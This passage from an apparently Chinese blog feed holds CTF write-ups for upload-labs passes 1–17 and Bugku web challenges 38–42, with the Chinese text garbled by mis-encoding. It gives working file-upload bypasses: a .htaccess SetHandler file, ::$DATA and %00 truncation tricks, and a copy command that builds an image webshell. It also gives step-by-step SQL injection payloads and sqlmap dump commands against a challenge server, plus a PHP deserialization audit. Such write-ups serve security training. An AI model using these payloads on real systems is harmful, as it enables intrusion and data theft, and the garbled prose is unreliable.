    <url>%2F2019%2F04%2F08%2Fupload-labs-1-17%2F</url>
    <content type="text"><![CDATA[ä¸€ã€pass011ã€é¦–å…ˆæˆ‘ä»¬å°è¯•ä¸‹ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå‘ç°æ–‡ä»¶ç±»å‹è¢«é™åˆ¶äº†æˆ‘ä»¬æŸ¥çœ‹ä¸‹æºç å‘ç°æ˜¯ä½¿ç”¨jsä»£ç å¯¹æ–‡ä»¶ç±»å‹è¿›è¡Œé™åˆ¶ã€‚é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨ç«ç‹æµè§ˆå™¨çš„æ’ä»¶Noscriptï¼Œæ‰“å¼€è¿™ä¸ªæ’ä»¶å³å¯ç¦ç”¨æ‰jsä»£ç ï¼Œç„¶åæˆåŠŸä¸Šä¼ PHP,æ–‡ä»¶ã€‚2ã€å½“ç„¶è¿™ä¸ªå¤ªéº»çƒ¦äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ é™¤è¿™ä¸ªåšæŒæ–‡ä»¶æ ¼å¼çš„å‡½æ•°å³å¯ã€‚3ã€æˆ‘ä»¬ä¸Šä¼ ä¸ªæ­£å¸¸çš„å›¾ç‰‡ï¼Œå›¾ç‰‡çš„è·¯å¾„ï¼šhttp://127.0.0.1/upload-lab/upload/1.jpgæŸ¥çœ‹å›¾ç‰‡è·¯å¾„å‘ç°æ–‡ä»¶åæ²¡è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åç±»å‹ï¼ŒæŠŠphpæ–‡ä»¶æ”¹ä¸ºjpgæ–‡ä»¶ï¼Œç„¶åé€šè¿‡æŠ“åŒ…å†æ”¹ä¸ºPHPæ–‡ä»¶ã€‚ äºŒã€pass02ä½¿ç”¨ç¬¬ä¸€é¢˜ä¸­çš„ç¬¬ä¸‰ç§æ–¹æ³•å³å¯ã€‚æŸ¥çœ‹æç¤ºmimeçš„æ„æ€å°±æ˜¯æ–‡ä»¶çš„åç¼€å ä¸‰ã€pass03å‘ç°ç¬¬äºŒé¢˜çš„æ–¹æ³•å·²ç»å¤±æ•ˆäº†ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸‹æºç ã€‚ $is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &apos;.&apos;);//æŸ¥æ‰¾å­—ç¬¦åœ¨æŒ‡å®šå­—ç¬¦ä¸²ä¸­ä»å·¦è¾¹å¼€å§‹çš„æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæˆåŠŸï¼Œè¿”å›è¯¥å­—ç¬¦ä»¥åŠå…¶åé¢çš„å­—ç¬¦ $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ï¼Œå°±å¯ä»¥é˜²æ­¢å¤§å°å†™é€ƒé€¸äº† $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = &apos;ä¸Šä¼ å‡ºé”™ï¼&apos;; } } else { $msg = &apos;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&apos;; } } else { $msg = UPLOAD_PATH . &apos;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&apos;; } } å¯ä»¥çœ‹åˆ°ä»£ç ä½¿ç”¨é»‘åå•æ¥è¿‡æ»¤ï¼Œphpçš„è¯æœ‰æ—¶å€™ï¼ˆé…ç½®çš„åŸå› ï¼‰phpã€php3ã€php4ã€php5ã€phtmlã€phtè¿™äº›åç¼€ä¹Ÿæ˜¯å¯ä»¥è¢«è§£æçš„ï¼Œå…¶ä»–è¯­è¨€ä¹Ÿæœ‰ç±»ä¼¼çš„æƒ…å†µï¼Œéœ€è¦å°è¯•ï¼š ç”±äºæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯phpstudy+windowsï¼Œç”±äºé…ç½®åŸå› æ˜¯è§£æä¸äº†php3ç­‰ç­‰è¿™äº›åç¼€çš„ å››ã€pass04ç¬¬å››é¢˜ç›´æ¥è¿›åˆ¶å¸¸è§çš„.asp|.aspx|.php|.jspç­‰å¸¸è§åç¼€æ–‡ä»¶ï¼Œä½†æ˜¯åˆä¸€ç§æ–‡ä»¶æ ¼å¼æ²¡ç¦ç”¨ï¼Œé‚£å°±æ˜¯.htaccess å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼ˆå°†è¯¥å€¼æ”¹ä¸ºallï¼‰ï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚ ç„¶åå…ˆä¸Šä¼ ,htaccessæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ &lt;FilesMatch &quot;2.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; .htaccessæ–‡ä»¶çš„å†…å®¹çš„æ„æ€æ˜¯ å¯¹2.jpgä½¿ç”¨phpé‡æ–°è§£æç„¶åå†ä¸Šä¼ jpgè„šæœ¬ï¼Œ äº”ã€pass05è§‚å¯Ÿæºç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæœ¬é¢˜æŠŠ.htaccessæ–‡ä»¶ä¹Ÿç¦ç”¨äº†ã€‚ä½†æ˜¯è®¤çœŸå¯¹æ¯”ä¸ç¬¬å››é¢˜çš„ä»£ç ï¼Œæœ¬é¢˜å»æ‰äº†å¤§å°å†™ç»•è¿‡çš„é€ƒé€¸ã€‚ å…­ã€pass06å¯¹æ¯”ç¬¬äº”é¢˜çš„æºç å¯ä»¥å‘ç°ï¼Œæœ¬é¢˜æºç å°‘äº† $file_ext = trim($file_ext); //é¦–å°¾å»ç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¸Šä¼ PHPæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨burp suitæŠ“åŒ…ä¿®æ”¹åç¼€åæ ¼å¼ä¸ºphpåŠ ç©ºæ ¼ã€‚ ä½†è¿”å›é¢˜ç›®æç¤ºæ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œä¸æ…Œè§‚å¯ŸæŠ“åŒ…çš„æ–‡ä»¶ï¼Œå…¶å®æ–‡ä»¶å·²ç»ä¸Šä¼ ï¼Œè·¯å¾„åœ¨æŠ“åŒ…é‡Œæœ‰ ä¸ƒã€pass07ä¸ç¬¬å…­é¢˜æºç å¯¹æ¯”ï¼Œå‘ç°å°‘äº†$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹è¿™å¥ä»£ç ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ã€‚é‚£ä¹ˆåœ¨æ–‡ä»¶åæœ«å°¾åŠ ä¸ªç‚¹å·å°±å¯ä»¥äº†ï¼Œå‚è€ƒç¬¬6é¢˜ å…«ã€pass08æ¯”ç¬¬ä¸ƒé¢˜å°‘äº†$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+&quot;::$DATA&quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒ&quot;::$DATA&quot;ä¹‹å‰çš„æ–‡ä»¶åã€‚ å‚è€ƒç¬¬6é¢˜ ä¹ã€pass09è¿™ä¸€å…³æ˜¯ä¸Šé¢å‡ å…³çš„ç»¼åˆï¼Œä½†æ˜¯ä»–æœ‰ä¸ªé€»è¾‘æ¼æ´ç¨‹åºå…ˆæ˜¯å»é™¤æ–‡ä»¶åå‰åçš„ç©ºæ ¼ï¼Œå†å»é™¤æ–‡ä»¶åæœ€åæ‰€æœ‰çš„.ï¼Œå†é€šè¿‡strrcharæ¥å¯»æ‰¾.æ¥ç¡®è®¤æ–‡ä»¶åçš„åç¼€ï¼Œä½†æ˜¯æœ€åä¿å­˜æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰é‡å‘½åè€Œä½¿ç”¨çš„åŸå§‹çš„æ–‡ä»¶åï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨ç±»ä¼¼one.php. .(ä¸¤ä¸ªç‚¹å·ä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼)ç»•è¿‡ï¼Œè¿™æœ‰ç‚¹åƒsqlæ³¨å…¥ä¸­çš„re_placeåªè¿‡æ»¤ä¸€æ¬¡å…³é”®å­—ã€‚æ“ä½œä¸ç¬¬6é¢˜ç±»ä¼¼. åã€pass10ä¸Šä¼ phpæ–‡ä»¶å‘ç°ï¼Œæ–‡ä»¶åç¼€åæ²¡æ‰äº†ã€‚ä¸Šä¼ jpgæ–‡ä»¶ä¸€åˆ‡æ­£å¸¸ã€‚æ€€ç–‘æ˜¯ç»•è¿‡è§‚å¯Ÿä¸‹æºç  $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); ç”±è¿™3å¥å¯ä»¥çœ‹å‡ºï¼Œéƒ¨åˆ†æ–‡ä»¶1åç¼€åè¢«æ›¿æ¢æˆäº†ç©ºæ ¼é‚£ä¹ˆæˆ‘ä»¬æŠ“åŒ…ï¼Œè¯¥åç¼€åï¼ŒåŒå†™ç»•è¿‡ã€‚ åä¸€ã€pass11å…³é”®çš„ä»£ç åœ¨äºè¿™é‡Œçš„â€™save_pathâ€™æ˜¯ä¸€ä¸ªå¯æ§çš„å˜é‡ï¼Œä½†æ˜¯åé¢è¿˜æ‹¼æ¥ä¸Šä¸€ä¸ªåç¼€åï¼Œä¹Ÿéœ€è¦ç»•è¿‡ $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨%00æˆªæ–­ï¼Œä½†è¿™ä¸œè¥¿æœ‰ç‚¹è¿‡æ°”äº†ï¼Œå› ä¸ºéœ€è¦ä¸¤ä¸ªæ¡ä»¶phpç‰ˆæœ¬å°äº5.3.4phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€å¦‚æœè¦å®Œæˆè¿™ä¸€ä¸ªé¢˜ç›®å°±å¿…é¡»è¦å®ç°ä¸Šé¢çš„ä¸¤ä¸ªæ¡ä»¶ï¼Œä½†æ˜¯ç°åœ¨éƒ½PHP7äº†ï¼Œè¿™ä¸œè¥¿ä¹Ÿå°±å¾ˆå°‘è§äº†ï¼Œæ»¡è¶³ä¸Šé¢çš„æ¡ä»¶çš„æ—¶å€™phpå°±æ˜¯æŠŠå®ƒå½“æˆç»“æŸç¬¦ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™ä¹Ÿå¯¼è‡´äº†å¾ˆå¤šçš„é—®é¢˜ï¼Œæ–‡ä»¶åŒ…å«ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ‰€ä»¥å¦‚æœè¦ç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å»å®ç°ï¼Œå¦save_pathç­‰äºä¸‹é¢çš„å€¼ ../upload/4.php%001 åäºŒã€pass12è¿™é‡Œçš„æºä»£ç å°±æ”¹äº†ä¸€ç‚¹ç‚¹ï¼Œå°±æ˜¯æŠŠgetæ”¹ä¸ºpostç±»å‹ï¼Œä¸€æ ·çš„æ–¹å¼ç»•è¿‡ï¼Œåªä¸è¿‡è¿™é‡Œéœ€è¦åœ¨äºŒè¿›åˆ¶é‡Œé¢ä¿®æ”¹%00ï¼Œå› ä¸ºpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚ $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; åä¸‰ã€pass13è§‚å¯Ÿæºç å¯ä»¥å‘ç°åªå¯¹æ–‡ä»¶çš„å¤´2ä¸ªå­—èŠ‚åšæ£€æµ‹ $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); åˆ¶ä½œæœ¨é©¬å›¾ç‰‡ï¼Œç„¶åä¸Šä¼ å³å¯ï¼Œä¸Šä¼ å›¾ç‰‡ååˆ©ç”¨å°±è¦ç»“å’Œæ–‡ä»¶åŒ…å«æ¼æ´äº†ã€‚ åˆ¶ä½œæœ¨é©¬å›¾ç‰‡æœ€ç®€å•çš„æ–¹å¼ copy 1.jpg /b + 1l.php /a 1.jpg åå››ã€pass14æ˜¯è¿™é‡Œç”¨getimagesizeè·å–æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡ï¼šä»‹ç»ä¸‹getimagesize array getimagesize ( string $filename [, array &amp;$imageinfo ] ) getimagesize() å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹å’Œä¸€ä¸ªå¯ä»¥ç”¨äºæ™®é€š HTML æ–‡ä»¶ä¸­ IMG æ ‡è®°ä¸­çš„ height/width æ–‡æœ¬å­—ç¬¦ä¸²ã€‚ å¦‚æœä¸èƒ½è®¿é—® filename æŒ‡å®šçš„å›¾åƒæˆ–è€…å…¶ä¸æ˜¯æœ‰æ•ˆçš„å›¾åƒï¼Œgetimagesize() å°†è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ã€‚ åäº”ã€pass15è¿™é‡Œç”¨åˆ°php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡ï¼š åå…­ã€pass16imagecreatefrom ç³»åˆ—å‡½æ•°ç”¨äºä»æ–‡ä»¶æˆ– URL è½½å…¥ä¸€å¹…å›¾åƒï¼ŒæˆåŠŸè¿”å›å›¾åƒèµ„æºï¼Œå¤±è´¥åˆ™è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚ è¯¥ç³»åˆ—å‡½æ•°æœ‰ï¼š imagecreatefromgif()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» GIF æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefromjpeg()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» JPEG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefrompng()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» PNG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefromwbmp()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» WBMP æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefromstring()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»å­—ç¬¦ä¸²ä¸­çš„å›¾åƒæµæ–°å»ºä¸€å‰¯å›¾åƒ è¿™ä¸€å…³å¯¹åç¼€åå’Œæ–‡ä»¶ç±»å‹å•¥çš„éƒ½è¿›è¡Œäº†å¾ˆä¸¥æ ¼çš„æ§åˆ¶ï¼Œè€Œä¸”åœ¨åé¢è¿˜å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡ç¼–è¯‘è¿™ä¸€ä¸ªé¢˜ç›®çš„æ€è·¯ï¼Œå¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œå°†Webshellä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ï¼Œä¸‹è½½ä¸‹æ¥åå‘ç°è¿™ä¸€éƒ¨åˆ†æ’å…¥ä»£ç çš„æ²¡å˜ä½†æ˜¯å…¶ä»–éƒ¨åˆ†éƒ½å˜äº†ã€‚å…¶ä»–éƒ¨åˆ†ä¸13é¢˜ä¸€æ · åä¸ƒã€pass17å‚è€ƒè¿™ç¯‡åšå®¢http://www.cnblogs.com/jinqi520/p/9977256.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 38-48 writeup(web)]]></title>
    <url>%2F2019%2F04%2F08%2Fbugku-38-48%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ç¬¬38é¢˜ï¼ˆè¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»é™†æ¡†ï¼‰æ–¹æ³•ä¸€é¦–å…ˆæˆ‘ä»¬æŠ“åŒ…ï¼Œç»è¿‡ä¸€äº›å°è¯•å‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼Œå¹¶ä¸”sqlè¯­å¥æ˜¯ä½¿ç”¨â€œæ¥é—­åˆçš„ã€‚çˆ†æ•°æ®åº“ admin_name=1&quot; union select database(),2#&amp;admin_passwd=1&amp;submit=GO+GO+GO çˆ†æ•°æ®è¡¨ admin_name=1&quot; union select (select table_name from information_schema.tables where table_schema=database() limit 0,1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO çˆ†å­—æ®µå admin_name=1&quot; union select (select column_name from information_schema.columns where table_name=&apos;flag1&apos;),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO çˆ†æ•°æ® admin_name=1&quot; union select (select flag1 from flag1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO æ–¹æ³•äºŒå°†æŠ“åˆ°çš„æŠ¥ä¿å­˜ä¸º.txtæ–‡ä»¶æ”¾åœ¨sqlmapçš„å®‰è£…ç›®å½•ä¸‹ã€‚çˆ†æ•°æ®åº“ python2 sqlmap.py -r &quot;3.txt&quot; -p admin_name --dbs çˆ†è¡¨ python2 sqlmap.py -r &quot;3.txt&quot; -D bugkusql1 -p admin_name --tables çˆ†å­—æ®µåçˆ†æ•°æ® python2 sqlmap.py -r &quot;3.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump ä»¥ä¸Š2ç§æ–¹æ³•å‡æ˜¯å¯¹admin_nameè¿›è¡Œæ³¨å…¥ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å¯¹admin_passwdè¿›è¡Œæ³¨å…¥ äºŒã€ç¬¬39é¢˜ï¼ˆå¤šæ¬¡ï¼‰å°è¯•id=1&apos;,å‘ç°æŠ¥é”™ï¼Œ å°è¯•id=1&apos; --+å‘ç°æ²¡æœ‰æŠ¥é”™ è¯´æ˜å­˜åœ¨sqlæ³¨å…¥ å°è¯•id=1&apos; or --+æŠ¥é”™ï¼Œ è¯´æ˜å­˜åœ¨æŸç§è¿‡æ»¤ å°è¯•id=1&apos; oorr --+å‘ç°æ²¡æœ‰æŠ¥é”™ åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¼‚æˆ–æ³¨å…¥æ¥æ£€æŸ¥å“ªäº›å­—ç¬¦è¢«è¿‡æ»¤è¿™æ—¶æˆ‘ä»¬å¯ä»¥ç”¨å¼‚æˆ–æ³¨å…¥æ¥æ£€æµ‹ï¼Œå¼‚æˆ–å³ä¸¤ä¸ªæ¡ä»¶ç›¸åŒï¼ˆåŒçœŸæˆ–åŒå‡ï¼‰å³ä¸ºå‡ http://123.206.87.240:9004/1ndex.php?id=1&apos;^(length(&apos;or&apos;)!=0)--+ å½“lengthï¼ˆï¼‰é‡Œçš„å­—ç¬¦è¢«è¿‡æ»¤æ—¶ï¼Œå°±è¾“å‡ºthere is nothing.ç»è¿‡ä¸€äº›å°è¯•å¯ä»¥çŸ¥é“and or select unionè¢«ç»•è¿‡ å¼€å§‹çˆ†æ•°æ®åº“ http://123.206.87.240:9004/1ndex.php?id=-1&apos; uniunionon seselectlect 1,database()--+ å¯ä»¥çˆ†å‡ºæ•°æ®åº“ä¸ºçˆ†è¡¨ http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&quot;web1002-1&quot;--+ çˆ†å­—æ®µ http://123.206.87.240:9004/1ndex.php?id=-1&apos; uniunionon seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&quot;flag1&quot;--+ çˆ†æ•°æ® http://123.206.87.240:9004/1ndex.php?id=-1&apos; uniunionon seselectlect 1,flag1 from flag--+ æäº¤flag å‘ç°æ˜¯å‡çš„flag,é‚£ä¹ˆæˆ‘ä»¬çˆ†å¦ä¸€ä¸ªå­—æ®µä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•ï¼Œç»è¿‡å°è¯•å‘ç°æˆ‘ä»¬æ³¨å…¥çš„ä»£ç ä¼šåœ¨IPå¤„ä¸è§£æçš„è¾“å‡ºé‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸‹æŠ¥é”™æ³¨å…¥çˆ†æ•°æ®åº“ http://123.206.87.240:9004/Once_More.php?id=1&apos; and (extractvalue(1,concat(0x7e,database(),0x7e)))--+ çˆ†æ•°æ®è¡¨http://123.206.87.240:9004/Once_More.php?id=1&#39; and(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columnswhere table_schema=â€web1002-2â€),0x7e)))â€“+çˆ†å­—æ®µï¼ˆå…¶å®æˆ‘ä»¬å¯ä»¥çŒœæµ‹å­—æ®µåä¸ºflag2ï¼‰ http://123.206.87.240:9004/Once_More.php?id=1&apos; and (extractvalue(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema=&quot;web1002-2&quot; and table_name=&quot;flag2&quot;),0x7e)))--+ çˆ†flag http://123.206.87.240:9004/Once_More.php?id=1&apos; and (extractvalue(1,concat(0x7e, (select group_concat(flag2) from flag2),0x7e)))--+ ä¸‰ã€ç¬¬40é¢˜ï¼ˆPHP_encrypt_1ï¼‰é¢˜ç›®ç»™å‡ºäº†å‹ç¼©åŒ…ï¼Œä¸‹è½½æ‰“å¼€ï¼Œå‘ç°æ˜¯æŸç§åŠ å¯†æ–¹å¼ï¼Œéœ€è¦æˆ‘ä»¬é˜…è¯»ä»£ç ï¼Œå†™å‡ºè§£å¯†ä»£ç  &lt;?php function encrypt($data,$key) { $key = md5(&apos;ISCC&apos;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) { if ($x == $klen) { $x = 0; } $char .= $key[$x]; $x+=1; } for ($i=0; $i &lt; $len; $i++) { $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); } return base64_encode($str); } ?&gt; å‚è€ƒç½‘ä¸Šçš„å¤§ä½¬å†™çš„ä»£ç ï¼Œè¯¥é¢˜æ¶‰åŠå¯†ç å­¦ï¼Œé€†å‘ï¼Œweb &lt;?php function decrypt($str) { $mkey = &quot;729623334f0aa2784a1599fd374c120d&quot;; $klen = strlen($mkey); $tmp = $str; $tmp = base64_decode($tmp); // å¯¹ base64 åçš„å­—ç¬¦ä¸² decode $md_len = strlen($tmp); //è·å–å­—ç¬¦ä¸²é•¿åº¦ for ($i=0; $i &lt; $md_len; $i++) { // å–äºŒæ¬¡åŠ å¯†ç”¨ key; if ($x == $klen) // æ•°æ®é•¿åº¦æ˜¯å¦è¶…è¿‡ key é•¿åº¦æ£€æµ‹ $x = 0; $char .= $mkey[$x]; // ä» key ä¸­å–äºŒæ¬¡åŠ å¯†ç”¨ key $x+=1; } $md_data = array(); for($i=0;$i&lt;$md_len;$i++) { // å–åç§»åå¯†æ–‡æ•°æ® array_push($md_data, ord($tmp[$i])); } $md_data_source = array(); $data1 = &quot;&quot;; $data2 = &quot;&quot;; foreach ($md_data as $key =&gt; $value) { // å¯¹åç§»åçš„å¯†æ–‡æ•°æ®è¿›è¡Œè¿˜åŸ $i = $key; if($i &gt;= strlen($mkey)) {$i = $i - strlen($mkey);} $dd = $value; $od = ord($mkey[$i]); array_push($md_data_source,$dd); $data1 .= chr(($dd+128)-$od); // ç¬¬ä¸€ç§å¯èƒ½, ä½™æ•°+128-key ä¸ºå›å½’æ•° $data2 .= chr($dd-$od); // ç¬¬äºŒç§å¯èƒ½, ä½™æ•°ç›´æ¥-key ä¸ºå›å½’æ•° } print &quot;data1 =&gt; &quot;.$data1.&quot;&lt;br&gt;\n&quot;; print &quot;data2 =&gt; &quot;.$data2.&quot;&lt;br&gt;\n&quot;; } $str = &quot;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&quot;; decrypt($str); ?&gt; å››ã€ç¬¬41é¢˜ï¼ˆæ–‡ä»¶åŒ…å«2ï¼‰ç”±äºæ— æ³•æ‰“å¡è¯¥é¢˜ç›®ç½‘ç«™ï¼Œæœ¬é¢˜ç•¥ å››ã€ç¬¬42é¢˜ï¼ˆæ–‡ä»¶åŒ…å«2ï¼‰è¿™é¢˜è€ƒçš„æ˜¯ä»£ç å®¡è®¡é¦–å…ˆï¼Œæˆ‘ä»¬æäº¤loginå‘ç°æ²¡ååº”ï¼Œé¢˜ç›®æç¤ºhinté‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥ï¼Ÿhint=1è¯•è¯•ï¼Œå‘ç° &lt;?php error_reporting(0); include_once(&quot;flag.php&quot;); $cookie = $_COOKIE[&apos;ISecer&apos;]; if(isset($_GET[&apos;hint&apos;])){ show_source(__FILE__); } elseif (unserialize($cookie) === &quot;$KEY&quot;) { echo &quot;$flag&quot;; } else { ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php } $KEY=&apos;ISecer:www.isecer.com&apos;; ?&gt; ç„¶åå¼€å§‹å®¡è®¡ä»£ç å‘ç°ï¼Œè¿™æ˜¯ä¸ªphpååºåˆ—ã€‚ $cookie = $_COOKIE[&apos;ISecer&apos;]; ä»£ç 